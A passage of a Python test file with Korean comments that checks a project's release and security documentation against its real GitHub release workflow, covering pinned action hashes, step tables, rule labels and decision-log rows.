        self.assertTrue(golden.ci_problems(swapped_ci), "ci.yml 의 단계 목록은 새 액션을 받아 주지 않는다")
        self.assertTrue(golden.package_problems(swapped_package), "package.yml 의 단계 목록은 새 액션을 받아 주지 않는다")
        self.assertNotEqual(wf.workflow_texts().get("ci.yml"), None)


def doc_section(rel, heading):
    """문서에서 `heading` 으로 시작하는 절(다음 `## ` 머리 줄 앞까지 — 없으면 끝까지)."""
    body = (ROOT / rel).read_text(encoding="utf-8").replace("\r\n", "\n")
    start = body.index(heading)
    following = body.find("\n## ", start + 1)
    return body[start:] if following < 0 else body[start:following]


class DocsAgreeWithTheWorkflowTest(unittest.TestCase):
    """문서(RELEASE.md 새 절·SECURITY.md 규칙 표·결정 행)가 진짜 워크플로와 같은 사실을 적는다 — 단계를 더하거나 액션 값을 바꾸면서 문서를 안 고치면 빨개진다."""

    HEADING = "## 릴리스 워크플로(`release.yml`)"

    def setUp(self):
        self.release = doc_section("docs/RELEASE.md", self.HEADING)
        self.security = doc_section("docs/SECURITY.md", self.HEADING)

    def test_the_release_section_names_the_four_pinned_actions_with_their_tags_and_the_reading_date(self):
        for name, (sha, version) in APPROVED.items():
            self.assertIn(name, self.release)
            self.assertIn(sha, self.release, name)
            self.assertIn(version, self.release, name)
        self.assertIn("2026-11-24", self.release)
        self.assertIn("앞 7자리와 끝 4자리", self.release, "운영자 대조 절차")

    def test_the_step_table_has_one_row_per_step_of_the_real_workflow(self):
        rows = [line for line in self.release.split("\n") if re.match(r"^\| ?(`build`|`sign-and-draft`)? ?\| (\d+|1·2) \| ", line)]
        jobs = yamlsub.load(REAL)["jobs"]
        # sign-and-draft 의 1·2 단계(가져오기·파이썬)는 한 줄로 합쳐 적었다
        self.assertEqual(len(rows), len(jobs["build"]["steps"]) + len(jobs["sign-and-draft"]["steps"]) - 1)
        self.assertEqual(sum(1 for row in rows if row.startswith("| `build` |")), 1)
        self.assertEqual(sum(1 for row in rows if row.startswith("| `sign-and-draft` |")), 1)

    def test_every_script_and_subcommand_the_workflow_calls_is_named_in_the_release_section(self):
        for job in yamlsub.load(REAL)["jobs"].values():
            for _position, _name, body in support.run_bodies(job):
                for command in support.shell_commands(body):
                    words = support.command_words(command)
                    if words[:1] == ["python"] and len(words) >= 2 and words[1].endswith(".py"):
                        self.assertIn(words[1].rsplit("/", 1)[1], self.release, words[1])
                        if re.fullmatch(r"[a-z][a-z-]*", words[2] if len(words) > 2 else ""):
                            self.assertIn(words[2], self.release, words[1] + " " + words[2])
        for flag in ("--draft", "--target", "--min-version", "--require-shipped-key", "--require-openssl", "--phase final"):
            self.assertIn(flag, self.release, flag)

    def test_each_step_table_row_names_the_script_subcommand_and_options_of_its_own_step(self):
        """독립 검증 Q 의 M01·M05: 위 시험은 '절 안에 낱말이 있는가' 만 봐서 같은 낱말이 다른 곳에도 있으면 단계표 줄 하나의 변경을 못 잡았다 — 단계 줄마다 그 단계의 스크립트·하위 명령·옵션 낱말이 **그 줄 안에** 있는지 본다."""
        rows = [line for line in self.release.split("\n") if re.match(r"^\| ?(`build`|`sign-and-draft`)? ?\| (\d+|1·2) \| ", line)]
        jobs = yamlsub.load(REAL)["jobs"]
        build_rows, sign_rows = rows[:9], rows[9:]
        self.assertEqual((len(build_rows), len(sign_rows)), (9, 12))
        steps = jobs["sign-and-draft"]["steps"]
        pairs = list(zip(jobs["build"]["steps"], build_rows)) + [(steps[0], sign_rows[0]), (steps[1], sign_rows[0])] + [(step, sign_rows[position - 1]) for position, step in enumerate(steps) if position >= 2]
        gh_needles = {"초안 만들기(공개하지 않는다)": ("gh release create", "--draft", "--prerelease", "--target"), "사후 점검(초안이 있고 태그는 아직 없다)": ("matching-refs", "100개")}
        seen, checked = set(), 0
        for step, row in pairs:
            body = step.get("run")
            if not isinstance(body, str):
                continue
            for needle in gh_needles.get(step["name"], ()):
                self.assertIn(needle, row, f"{step['name']}: {needle}")
                checked += 1
            for command in support.shell_commands(body):
                words = support.command_words(command)
                if words[:1] == ["python"] and len(words) >= 2 and words[1].endswith(".py") and tuple(words) not in seen:
                    seen.add(tuple(words))                                                            # 같은 명령줄을 되풀이한 단계(사전 점검 다시)는 '같은 스크립트' 라고만 적는다
                    for needle in [words[1]] + [word for word in words[2:] if word.startswith("--") or re.fullmatch(r"[a-z][a-z-]*", word)]:
                        self.assertIn(needle, row, f"{step['name']}: {needle}")
                        checked += 1
        self.assertGreater(checked, 25)

    def test_the_decision_rows_keep_their_exact_what_was_not_done_phrases_and_the_changelog_names_the_decision_ranges(self):
        """독립 검증 Q 의 M08·M10: 낱말이 복수형 속에 부분 문자열로 남아 지운 줄을 못 잡았고(attestation·attestations), CHANGELOG 줄은 어떤 시험도 못박지 않았다."""
        rows = {match.group(1): line for line in (ROOT / "docs" / "DECISIONS.md").read_text(encoding="utf-8").splitlines() for match in [re.match(r"^\| (D-\d+) \|", line)] if match}
        for phrase in ("① 러너 스모크 단계", "② Velopack 쪽", "③ `--publish`", "④ 아티팩트 증명서(attestation)", "⑤ 액션 메이저 갱신", "⑥ `build` 를 두 번 돌려", "⑦ CODEOWNERS"):
            self.assertIn(phrase, rows["D-885"], phrase)
        changelog = (ROOT / "CHANGELOG.md").read_text(encoding="utf-8").replace("\r\n", "\n")
        unreleased = changelog.split("\n## [0.0.0]")[0]
        bullets = [line for line in unreleased.split("\n") if (line.startswith("- ") and "release.yml" in line) or line.startswith("- 릴리스 워크플로 준비의 독립 검증")]
        self.assertEqual(len(bullets), 2, "릴리스 워크플로 줄은 처음 구현 하나와 재작업 1 하나")
        self.assertTrue(all(word in bullets[0] for word in ("결정 D-880에서 D-885", "T3 범위 안", "병합하지 않는 가지에만")))
        self.assertTrue(all(word in bullets[1] for word in ("재작업 1", "결정 D-886에서 D-891", "필수 S-1", "X-3", "시험 렌즈 Q", "시험 id 사라짐 0", "모두 잡힘")))

    def test_the_security_section_has_a_row_for_every_rule_the_checker_has(self):
        for label in [f"W-{number}" for number in range(1, 17)] + ["X-1", "X-2", "X-3", "구조"]:
            self.assertRegex(self.security, r"(?m)^\| " + re.escape(label) + r" \| ", label)
        self.assertIn("UPDATE_SIGNING_KEY", self.security)
        self.assertIn("한계(사실대로)", self.security)

    def test_the_decision_rows_d880_to_d885_exist_and_state_the_scope_and_what_was_not_done(self):
        rows = {match.group(1): line for line in (ROOT / "docs" / "DECISIONS.md").read_text(encoding="utf-8").splitlines() for match in [re.match(r"^\| (D-\d+) \|", line)] if match}
        for number in ("D-880", "D-881", "D-882", "D-883", "D-884", "D-885"):
            self.assertIn(number, rows)
        self.assertTrue(all(word in rows["D-880"] for word in ("확인 048", "정확히", "하지 않은 것", "병합", "T3")))
        self.assertTrue(all(word in rows["D-884"] for word in ("2026-11-24", "다시 읽지 못했다", "d3f86a106a0bac45b974a628896c90dbdf5c8093")))
        self.assertTrue(all(word in rows["D-885"] for word in ("러너 스모크", "Velopack", "--publish", "attestation", "메이저", "러너에서만 확인되는 것")))

    def test_the_rework_rows_d886_to_d891_and_the_limits_the_independent_checks_asked_for_are_in_the_docs(self):
        """독립 검증 S 의 R-7·R-9·R-10: 해시 고정이 아니라는 한계·'1차 방어는 정확한 글 목록, 규칙은 2차 그물'·결정 행·시험 개수 정정이 문서에 있고, 옛 숫자('34개'·'자산 다섯')가 남지 않았다."""
        rows = {match.group(1): line for line in (ROOT / "docs" / "DECISIONS.md").read_text(encoding="utf-8").splitlines() for match in [re.match(r"^\| (D-\d+) \|", line)] if match}
        wanted = {"D-886": ("재작업 1", "더 엄격한", "하지 않은 것", "병합"), "D-887": ("S-1", "Zs", "역슬래시", "isascii"), "D-888": ("R-1", "R-2", "R-4", "R-5", "X-3", "2차 그물"),
                  "D-889": ("matching-refs", "per_page=100", "실패 닫힘", "동작 시험"), "D-890": ("R-7", "R-9", "R-10", "--require-hashes"),
                  "D-891": ("시험 렌즈 Q", "홀로 맡는", "동치 변이", "권고 1", "권고 5", "문서 변이")}
        for number, words in wanted.items():
            self.assertIn(number, rows)
            for word in words:
                self.assertIn(word, rows[number], f"{number}: {word}")
        self.assertNotIn("`tests/test_release_workflow.py` 34개", rows["D-882"], "D-882 의 옛 개수(34)는 바로잡혀 있다")
        for word in ("1차 방어는 정확한 글 목록", "2차 그물", "--require-hashes", "한계 ⑥"):
            self.assertIn(word, self.security + self.release, word)
        self.assertIn("--require-hashes", self.release)
        self.assertIn("--require-hashes", self.security)
        self.assertIn("100개", self.release, "사후 점검이 릴리스 목록의 최신 100개를 읽는다는 설명")
        self.assertNotIn("자산 다섯", self.release)

    def test_the_new_docs_have_no_address_scheme_tilde_or_double_brace(self):
        for body in (self.release, self.security):
            self.assertIsNone(URL.search(body))
            self.assertNotIn(TILDE, body)
            self.assertNotIn("{{", body)


if __name__ == "__main__":
    unittest.main()
